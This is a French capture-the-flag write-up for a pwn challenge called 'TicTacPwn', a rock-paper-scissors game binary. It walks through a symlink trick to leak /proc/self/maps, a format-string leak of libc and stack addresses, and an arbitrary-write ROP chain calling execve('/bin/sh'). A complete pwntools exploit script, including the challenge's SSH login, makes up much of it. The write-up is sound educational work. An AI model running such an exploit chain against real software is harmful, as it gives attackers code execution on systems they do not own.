# Prise de connaissance

La première étape de ce challenge, baptisé "TicTacPwn", consiste à comprendre le binaire et son fonctionnement général.


TicTacPwn prend la forme d'un jeu inspiré du célèbre "[Pierre-Feuille-Ciseaux](https://fr.wikipedia.org/wiki/Pierre-papier-ciseaux)". Lors du lancement du programme, une option nous est offerte : charger ou non une carte personnalisée pour la "Pierre", représentée en [ASCII Art](https://fr.wikipedia.org/wiki/Art_ASCII).

Après avoir fait ce choix, le joueur entre en confrontation avec l'ordinateur. Ce dernier sélectionne de manière aléatoire l'une des trois possibilités (Pierre, Feuille, Ciseaux) et demande au joueur de faire de même. Ce processus se répète jusqu'à la fin de la partie, le premier à atteindre un score de 3 étant déclaré vainqueur.

En cas de défaite, le programme se ferme abruptement, ajoutant une couche de complexité au challenge. En revanche, en cas de victoire, le joueur est invité à écrire une valeur de 8 octets à une adresse mémoire de son choix. Une nouvelle partie démarre ensuite.

# Analyse des différentes failles

## Fuite d'informations lors du chargement de fichier pour "pierre" :
L'option de charger un fichier pour la représentation en ASCII Art de la "Pierre" dès le lancement du programme révèle les 16 premières lignes d'un fichier sur le disque. Bien que cette fonctionnalité puisse éveiller des soupçons quant à la lecture du flag, cela n'est pas possible. La récupération du flag nécessite l'exécution du programme "readflag" avec des droits root, localisé à la racine du disque.

## Vulnérabilité de type "Format String" lors de l'affichage de la victoire :
Une faille de type "format string" se présente avec l'utilisation de printf affichant le message de victoire. Le texte du printf est stocké dans la heap avec des droits d'écriture. Exploiter cette zone offre une opportunité d'attaque.
```c
printf("Good job on your win !\n"); // Fonction main
```

## Écriture arbitraire de 8 octets après chaque victoire :
Après chaque victoire, le joueur a la possibilité d'écrire 8 octets à une adresse mémoire de son choix. Cette fonctionnalité peut être exploitée pour des manipulations ultérieures.


## Prédictibilité des choix du bot dès la première partie :
Une faille dans l'initialisation de l'algorithme de génération de nombres aléatoires permet de connaître les choix du bot après la première partie. La valeur de sran est initialisée avec la même seed récupérée à partir du temps à l'ouverture du programme, entraînant une suite de nombres générés identique pour toutes les parties.
```c
srand(SEED); // Fonction main
```

## Conclusion
- En remportant la première partie, nous exploitons la prédictibilité des choix du bot, nous permettant ainsi de remporter chaque partie subséquente.
- La possibilité d'écrire 8 octets en mémoire après chaque victoire devient une exploitation puissante. En accumulant des victoires, nous pouvons écrire une quantité infinie d'octets à des adresses de notre choix, offrant un potentiel de manipulation de la mémoire du programme.
- La faille "format string" nous permet de leak des adresses de la stack : leak de la stack, leak de la libc, etc.

# Déroulement du scénario d'attaque

## Lecture du fichier pour obtenir l'adresse de la heap :
La première étape consiste à utiliser la fonctionnalité de lecture de fichier pour accéder à /proc/self/maps, qui contient les adresses mémoires du programme en cours d'exécution. Cependant, en se limitant à la lecture des 16 premières lignes, seule l'adresse de la heap peut être obtenue, tandis que l'adresse de la stack reste inaccessible.

## Exploitation de la vulnérabilité "Format String" pour le leaking d'adresses cruciales :
Grâce à l'adresse de la heap récupérée, l'exploitation de la vulnérabilité "format string" permet la réécriture de la chaîne de caractères dans la heap. Cette action est stratégique pour le leaking des adresses de la stack et de la libc.

## Écriture d'une ROPchain avec les adresses obtenues :
Une fois en possession des adresses de la stack et de la libc, l'étape suivante consiste à construire une ROPchain, positionnée sur la stack, qui sera exécutée ultérieurement.

## Déclenchement de l'exécution de la ROPchain en perdant une partie :
Pour déclencher l'exécution de la ROPchain, il suffit de perdre une partie, amenant le programme à atteindre l'instruction de retour.

## Obtention d'un shell par l'exécution de la ROPchain :
L'exécution de la ROPchain entraîne le "pop" d'un shell, fournissant ainsi un accès complet au système et complétant avec succès le scénario d'attaque.

Nous pouvons ainsi exécuter le programme "/readflag"

# Première partie - Leak de la heap

Le chargement d'une carte personnalisée pour "Pierre" dans le programme TicTacPwn est soumis à des conditions spécifiques :
- Le fichier doit impérativement comporter 16 lignes.
- Une des lignes du fichier doit être constituée de 16 caractères.

Une fois ces conditions satisfaites, le chemin d'accès au fichier est stocké en mémoire. Le fichier est ensuite réouvert, et les 16 premières lignes sont lues, chaque ligne pouvant contenir jusqu'à 255 caractères.

**Remarque Importante** : Ces conditions sont présentes uniquement lors du chargement de la carte pour récupérer le chemin d'accès au fichier. Après cela, elles ne sont plus requises pour l'affichage du fichier lorsque nous choisissons "Pierre" durant une partie.

Pour exploiter cette vulnérabilité et réaliser un leak de la heap, nous suivrons les étapes suivantes :

1. Création d'une structure de fichier respectant les conditions :
   1. Créer un dossier nommé "toto" dans le dossier "/tmp" contenant un fichier "maps" qui respecte les conditions de chargement.
2. Chargement de la carte au lancement du programme :
   1. Charger la carte "Pierre" à l'ouverture du programme en utilisant le chemin du fichier préalablement créé, /tmp/toto/maps.
3. Remplacement du dossier par un lien symbolique :
   1. Une fois le chemin du fichier conservé en mémoire, supprimer le dossier "toto" et le remplacer par un lien symbolique pointant sur /proc/self.
4. Affichage des 16 premières lignes du fichier /proc/self/maps :
   1. Durant le déroulement d'une partie, choisir "Pierre" pour déclencher l'affichage des 16 premières lignes du fichier /tmp/toto/maps, qui pointe désormais vers /proc/self/maps.

```python
CARD_PATH = '/tmp/toto'
WIN_MESSAGE = 'Good job on your win !'
EXIT_MESSAGE = 'You chose to exit. Bye!'
QUESTION_CHOICE_MESSAGE = 'What do you pick ?'

DEBUG = False

def remove_card_folder():
	global CARD_PATH, ssh_session, DEBUG
	if not DEBUG:
		sh = ssh_session.process('/bin/sh')
		sh.sendline(('rm -rf ' + CARD_PATH + '; exit'))
	else:
		if os.path.exists(CARD_PATH):
			if os.path.islink(CARD_PATH):
				os.unlink(CARD_PATH)
			else:
				maps_path = CARD_PATH + '/maps'
				if os.path.exists(maps_path):
					os.remove(maps_path)
				os.rmdir(CARD_PATH)

def create_card():
	global CARD_PATH, ssh_session, DEBUG
	card = "\n".join(["A"*16 for i in range(17)])
	filepath = CARD_PATH + '/maps'
	remove_card_folder()
	if not DEBUG:
		sh = ssh_session.process('/bin/sh')
		sh.sendline(('mkdir ' + CARD_PATH + ';echo "' + b64encode(card) + '" | base64 -d > ' + filepath + '; exit'))
	else:
		os.mkdir(CARD_PATH)
		with open(filepath, 'w') as f:
			f.write(card)

def create_symlink():
	global CARD_PATH, ssh_session, DEBUG
	remove_card_folder()
	if not DEBUG:
		sh = ssh_session.process('/bin/sh')
		sh.sendline(('ln -s /proc/self ' + CARD_PATH))
	else:
		os.symlink('/proc/self', CARD_PATH)

# Leak heap address
def load_card(p):
	p.recvuntil(b'Do you want to load a custom card for rock ?')
	p.sendline(b"y")

	p.recvuntil(b'Give me the path to the custom card:')

	create_card()
	p.sendline(b"/tmp/toto/maps")

	p.recvuntil(b'What do you pick ?')
	create_symlink()
	p.sendline(b"1")

	p.recvuntil(b'You chose rock !')
	maps = p.recvn(1000)

	addr_heap = int(re.findall(r"([abcdef\d]*)-[abcdef\d]*.*\n.*\[heap\]", maps)[0], 16)

	return addr_heap, maps

##########################################################################
##########################################################################
####################### LOAD CARD AND WIN THE GAME #######################
##########################################################################
success = False
while not success:
	if DEBUG:
		p = process(exe.path)
	else:
		ssh_session = ssh(host='ssh-zqmnmc.inst.malicecyber.com',user='user',password='user',port=4101)
		p = ssh_session.process('/challenge/tictacpwn')

	game_round = 1
	ADDR_HEAP, result = load_card(p)
	log.info('Heap address : ' + hex(ADDR_HEAP))

	# Rebase exe
	exe.address = ADDR_HEAP - 0x4000

	while EXIT_MESSAGE not in result and WIN_MESSAGE not in result:
		p.clean()
		p.sendline(b"1")
		result = p.recvuntil([WIN_MESSAGE, EXIT_MESSAGE, QUESTION_CHOICE_MESSAGE])
		game_round += 1

	success = WIN_MESSAGE in result
```

# Deuxième partie - Leak des adresses libc et stack

Pour progresser vers la deuxième étape du scénario d'attaque, la victoire dans le jeu est nécessaire.

Une fois la partie remportée, nous pouvons exploiter la vulnérabilité de type "format string" pour obtenir les adresses de la stack et de la libc. En utilisant l'offset approprié, nous ciblons spécifiquement les adresses recherchées :
- À l'offset 15 de la stack, nous trouvons l'adresse de la stack.
- À l'offset 19, nous identifions une adresse de la libc (__libc_start_main).

Le format de la chaîne de format suivante sera instrumental pour récupérer la valeur de la stack à l'offset spécifié : **%{offset}$llx**.
Cette technique permettra de lire directement les adresses nécessaires depuis stack, fournissant ainsi les informations cruciales pour la phase suivante de l'attaque.

```python
OFFSET_LIBC_START_CALL_MAIN = 122
OFFSET_LIBC_START_MAIN = 0xB0
OFFSET_RET_ADDR = 0x110

def write(p, addr, value, game_round=None, win=True):
	lose = game_round is None
	i = 0
	result = ''

	p.sendline(hex(addr)[2:])
	p.recvuntil(b'What do you want to write ?')
	p.sendline(value)

	while (lose and EXIT_MESSAGE not in result) or (not lose and i < game_round):
		result = p.recvuntil([QUESTION_CHOICE_MESSAGE, EXIT_MESSAGE])
		if EXIT_MESSAGE not in result:
			p.sendline(b"1" if win else "3")
		i += 1

def leak_addr(p, game_round, offset):
	write(p, exe.sym.WIN_MESSAGE, text2hex("%" + str(offset) + "$llx\0"), game_round)

	return int(p.recvuntil(b"You're now allowed to").split('\n')[-1].split("You're")[0], 16)


##########################################################################
##########################################################################
####################### LEAK ADDRESSES ###################################
##########################################################################
# Leak libc (__libc_start_call_main+OFFSET_LIBC_START_CALL_MAIN)
addr_libc_start_call_main = leak_addr(p, game_round, 15) - OFFSET_LIBC_START_CALL_MAIN
addr_libc_start_main = addr_libc_start_call_main + OFFSET_LIBC_START_MAIN
 
# Leak stack addr
addr_stack = leak_addr(p, game_round, 19)

# Ret addr
addr_ret = addr_stack - OFFSET_RET_ADDR

log.info('Leak libc_start_main : ' + hex(addr_libc_start_main))
log.info('Leak stack : ' + hex(addr_stack))
log.info('Leak ret address : ' + hex(addr_ret))
```

# Troisième partie - Ecriture de la ropchain et pop du shell

Dans cette partie, nous allons écrire la ropchain sur la stack :

```
# execve("/bin/sh", NULL, NULL);`

pop rdi; ret
"/bin/sh"

pop rsi; ret
0x0

pop rdx; ret
0x0

libc->execve addr
```

```python
##########################################################################
##########################################################################
####################### WRITE PAYLOAD ####################################
##########################################################################
# Rebase libc
libc.address = addr_libc_start_main - libc.sym.__libc_start_main

# Payload:
 
payload = [
	libc_rop.find_gadget(['pop rdi', 'ret']).address + libc.address,
	next(libc.search('/bin/sh')),
	libc_rop.find_gadget(['pop rsi', 'ret']).address + libc.address,
	0x0,
	libc_rop.find_gadget(['pop rdx', 'ret']).address + libc.address,
	0x0,
	libc.sym.execve,
]

# Write ROP chain
for i, value in enumerate(payload):
	write(p, addr_ret + (i * 8), hex(value)[2:], game_round, i < len(payload) - 1)


##########################################################################
##########################################################################
####################### CLEAN AND POP SHELL ##############################
##########################################################################
remove_card_folder()

p.clean()
p.interactive()
```

# Liens utiles

- https://github.com/Gallopsled/pwntools
- https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
